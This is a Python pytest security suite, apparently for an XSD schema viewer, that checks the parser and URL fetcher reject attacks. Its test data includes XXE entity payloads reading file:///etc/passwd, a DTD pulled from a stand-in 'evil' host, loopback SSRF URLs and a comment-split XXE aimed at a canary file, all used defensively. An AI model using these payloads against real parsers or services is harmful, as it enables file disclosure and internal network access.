"""Security tests: XXE, Billion-Laughs, SSRF must all be rejected."""

from __future__ import annotations

from unittest.mock import patch

import httpx
import pytest
from lxml import etree

from app import config as config_module
from app.parser import security
from app.parser.security import (
    SecurityError,
    fetch_schema_url,
    inspect_dtd,
    parse_bytes,
)
from app.parser.validation import validate_xml
from app.parser.xsd_parser import parse_single


class TestXxeProtection:
    def test_dtd_with_external_entity_rejected(self, xxe_attack_bytes: bytes) -> None:
        with pytest.raises(SecurityError):
            parse_bytes(xxe_attack_bytes, "xxe.xsd")

    def test_parser_top_level_wrapper_rejects_dtd(self, xxe_attack_bytes: bytes) -> None:
        with pytest.raises(ValueError, match="DTD"):
            parse_single(xxe_attack_bytes, "xxe.xsd")


class TestBillionLaughs:
    def test_billion_laughs_rejected(self, billion_laughs_bytes: bytes) -> None:
        with pytest.raises(SecurityError):
            parse_bytes(billion_laughs_bytes, "bomb.xsd")


class TestSsrfProtection:
    def test_arbitrary_host_allowed_when_allowlist_empty(self) -> None:
        # Default behaviour: no ALLOWED_SCHEMA_HOSTS set means *any* public
        # host is permitted; only the SSRF/private-IP/scheme checks gate it.
        # We use a host that resolves to a private IP so the request never
        # actually leaves the test machine — the assertion proves the
        # allowlist gate no longer blocks unknown hosts.
        with patch.object(config_module.settings, "allowed_schema_hosts", ()):
            from app.parser import security as sec_module

            sec_module.settings = config_module.settings
            # localhost resolves to 127.0.0.1 → SSRF guard fires, not the
            # allowlist guard. The previous error wording would be
            # "not on ALLOWED_SCHEMA_HOSTS"; the new error is private/loopback.
            with pytest.raises(SecurityError, match="private/loopback"):
                fetch_schema_url("http://localhost/secret")

    def test_lockdown_allowlist_blocks_unlisted_host(self) -> None:
        import re as re_module

        with patch.object(
            config_module.settings,
            "allowed_schema_hosts",
            (re_module.compile(r"^trusted\.example\.com$"),),
        ):
            from app.parser import security as sec_module

            sec_module.settings = config_module.settings
            with pytest.raises(SecurityError, match="lockdown whitelist"):
                fetch_schema_url("http://evil.example.com/attack.xsd")

    def test_loopback_address_rejected_even_when_allowlisted(self) -> None:
        import re as re_module

        with patch.object(
            config_module.settings,
            "allowed_schema_hosts",
            (re_module.compile(r"localhost"),),
        ):
            from app.parser import security as sec_module

            sec_module.settings = config_module.settings
            with pytest.raises(SecurityError, match="private/loopback"):
                fetch_schema_url("http://localhost/secret")

    def test_non_http_scheme_rejected(self) -> None:
        with patch.object(config_module.settings, "allowed_schema_hosts", ()):
            from app.parser import security as sec_module

            sec_module.settings = config_module.settings
            with pytest.raises(SecurityError, match="only http"):
                fetch_schema_url("file:///etc/passwd")


class TestInternalDtdSubset:
    """A bounded internal subset of literal entities is allowed (W3C xmldsig)."""

    XS = b'<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" targetNamespace="&a;"/>'

    def test_w3c_xmldsig_schema_loads(self, xmldsig_bytes: bytes) -> None:
        model = parse_single(xmldsig_bytes, "xmldsig-core-schema.xsd")
        assert model.target_namespace == "http://www.w3.org/2000/09/xmldsig#"
        assert any(e.name == "Signature" for e in model.elements)

    def test_literal_entity_expanded(self) -> None:
        data = b'<!DOCTYPE schema [<!ENTITY a "urn:x">]>' + self.XS
        tree = parse_bytes(data, "s.xsd")
        assert tree.getroot().get("targetNamespace") == "urn:x"

    def test_external_dtd_is_never_loaded(self) -> None:
        data = b'<!DOCTYPE schema SYSTEM "file:///etc/passwd" [<!ENTITY a "urn:x">]>' + self.XS
        assert parse_bytes(data, "s.xsd").getroot().get("targetNamespace") == "urn:x"

    @pytest.mark.parametrize(
        "subset",
        [
            b'<!ENTITY a SYSTEM "file:///etc/passwd">',
            b'<!ENTITY % p SYSTEM "http://evil/x.dtd"> %p;',
            b'<!ENTITY a "&b;"><!ENTITY b "x">',
            b'<!ENTITY a "<xs:element/>">',
            b"<!ELEMENT a ANY>",
            b"<!NOTATION n SYSTEM 'x'>",
            b'<!ENTITY a "' + b"x" * 600 + b'">',
            b"".join(b'<!ENTITY e%d "v">' % i for i in range(33)),
        ],
    )
    def test_unsafe_subsets_rejected(self, subset: bytes) -> None:
        with pytest.raises(SecurityError, match="DTD"):
            parse_bytes(b"<!DOCTYPE schema [" + subset + b"]>" + self.XS, "s.xsd")

    @pytest.mark.parametrize(
        "data",
        [
            # An internal subset typing ``id`` as ID, as the W3C schemas do.
            b"<!DOCTYPE xs:schema [<!ATTLIST xs:element id ID #IMPLIED>]>"
            b'<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">'
            b'<xs:element name="a" id="Name"/><xs:element name="b" id="Name"/></xs:schema>',
            b'<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">'
            b'<xs:element name="a" xml:id="Name"/><xs:element name="b" xml:id="Name"/></xs:schema>',
        ],
        ids=["attlist-id", "xml-id"],
    )
    def test_duplicate_ids_do_not_fail_the_parse(self, data: bytes) -> None:
        # Uniqueness of IDs is a validity constraint, not well-formedness; a
        # viewer should still show such a schema ("ID Name already defined").
        assert len(parse_bytes(data, "s.xsd").getroot()) == 2

    def test_duplicate_ids_survive_validation_setup(self) -> None:
        # xml:id is a foreign attribute to the schema compiler, so this one
        # validates; and a compile on the same thread must not confuse the
        # next load (lxml's exception log leaks across operations).
        data = (
            b'<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">'
            b'<xs:element name="a" xml:id="Name"/><xs:element name="b" xml:id="Name"/></xs:schema>'
        )
        for _ in range(2):
            model = parse_single(data, "s.xsd")
            assert validate_xml(model, b"<a/>").is_valid

    def test_duplicate_id_does_not_excuse_other_errors(self) -> None:
        data = (
            b'<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">'
            b'<xs:element xml:id="Name"/><xs:element xml:id="Name"/><xs:oops></xs:schema>'
        )
        with pytest.raises(etree.XMLSyntaxError):
            parse_bytes(data, "s.xsd")

    def test_entity_declaration_outside_doctype_rejected(self) -> None:
        with pytest.raises(SecurityError):
            parse_bytes(self.XS + b'<!ENTITY a "x">', "s.xsd")


class TestFetchBehaviour:
    """Transport-level behaviour of ``fetch_schema_url`` (headers, error mapping)."""

    XSD = b'<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"/>'

    @pytest.fixture(autouse=True)
    def _no_dns(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from app.parser import security as sec_module

        monkeypatch.setattr(sec_module, "_verify_url", lambda url: (httpx.URL(url).host, ["203.0.113.10"]))

    def _mock(self, monkeypatch: pytest.MonkeyPatch, handler) -> None:
        import httpx

        from app.parser import security as sec_module

        transport = httpx.MockTransport(handler)
        real_client = httpx.Client

        def client_factory(**kwargs):
            return real_client(transport=transport, **kwargs)

        monkeypatch.setattr(sec_module.httpx, "Client", client_factory)

    def test_sends_descriptive_user_agent_and_accept(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import httpx

        from app import __version__

        seen: dict[str, str] = {}

        def handler(request: httpx.Request) -> httpx.Response:
            seen.update(request.headers)
            return httpx.Response(200, content=self.XSD, headers={"content-type": "text/xml"})

        self._mock(monkeypatch, handler)
        fetched = fetch_schema_url("https://example.org/a.xsd")
        assert fetched.content == self.XSD
        assert seen["user-agent"] == f"xsd-viewer.online/{__version__} (+https://www.xsd-viewer.online)"
        assert seen["accept"].startswith("application/xml")

    def test_http_error_names_the_reason_phrase(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import httpx

        self._mock(monkeypatch, lambda request: httpx.Response(404, content=b"nope"))
        with pytest.raises(SecurityError, match=r"failed with HTTP 404 Not Found"):
            fetch_schema_url("https://example.org/missing.xsd")

    def test_forbidden_suggests_uploading_instead(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import httpx

        self._mock(monkeypatch, lambda request: httpx.Response(403, content=b"blocked"))
        with pytest.raises(SecurityError, match=r"HTTP 403 Forbidden.*upload it here"):
            fetch_schema_url("https://example.org/a.xsd")

    def test_transport_errors_become_fetch_errors(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import httpx

        from app.parser.security import FetchError

        def handler(request: httpx.Request) -> httpx.Response:
            raise httpx.ConnectTimeout("timed out", request=request)

        self._mock(monkeypatch, handler)
        with pytest.raises(FetchError, match=r"fetching 'https://example.org/slow.xsd' failed: .*timed out"):
            fetch_schema_url("https://example.org/slow.xsd")
        assert issubclass(FetchError, SecurityError)


    def test_connects_to_the_validated_ip_keeping_the_host(self, monkeypatch: pytest.MonkeyPatch) -> None:
        seen: list[tuple[str, str]] = []

        def handler(request: httpx.Request) -> httpx.Response:
            seen.append((request.url.host, request.headers["host"]))
            return httpx.Response(200, content=self.XSD)

        self._mock(monkeypatch, handler)
        fetch_schema_url("https://example.org/a.xsd")
        # A rebinding DNS answer after the check cannot redirect the connection.
        assert seen == [("203.0.113.10", "example.org")]

    def test_oversized_and_dripping_responses_are_cut_off(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from app.config import settings

        self._mock(monkeypatch, lambda request: httpx.Response(200, content=iter([b"<x", b"/>"])))
        monkeypatch.setattr(settings, "fetch_deadline_seconds", -1)
        with pytest.raises(SecurityError, match="too slow"):
            fetch_schema_url("https://example.org/a.xsd")
        monkeypatch.setattr(settings, "fetch_deadline_seconds", 60)
        monkeypatch.setattr(settings, "fetch_max_response_mb", 0)
        with pytest.raises(SecurityError, match="cap"):
            fetch_schema_url("https://example.org/a.xsd")


def test_schema_urls_with_userinfo_are_refused() -> None:
    from app.parser.security import _verify_url

    with pytest.raises(SecurityError, match="user name or password"):
        _verify_url("https://u:p@example.org/a.xsd")


SPLIT_COMMENT_SUBSET = '<!ENTITY a "<!--"><!ENTITY x SYSTEM "file://{path}"><!ENTITY b "-->">'


def test_comment_split_across_entity_values_is_rejected(tmp_path) -> None:
    canary = tmp_path / "canary.txt"
    canary.write_text("CANARY-SECRET")
    doc = f"<!DOCTYPE r [{SPLIT_COMMENT_SUBSET.format(path=canary)}]><r>&x;</r>".encode()
    with pytest.raises(SecurityError):
        inspect_dtd(doc)


def test_internal_entity_parser_never_reads_external_entities(tmp_path) -> None:
    canary = tmp_path / "canary.txt"
    canary.write_text("CANARY-SECRET")
    doc = f'<!DOCTYPE r [<!ENTITY x SYSTEM "file://{canary}">]><r>&x;</r>'.encode()
    with pytest.raises(etree.XMLSyntaxError):
        etree.fromstring(doc, security.make_parser(internal_entities=True))


def test_comment_split_xxe_in_a_schema(tmp_path) -> None:
    canary = tmp_path / "canary.txt"
    canary.write_text("CANARY-SECRET")
    subset = SPLIT_COMMENT_SUBSET.format(path=canary)
    data = (
        f"<!DOCTYPE schema [{subset}]>"
        '<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" targetNamespace="&x;"/>'
    ).encode()
    with pytest.raises(SecurityError):
        parse_bytes(data, "s.xsd")
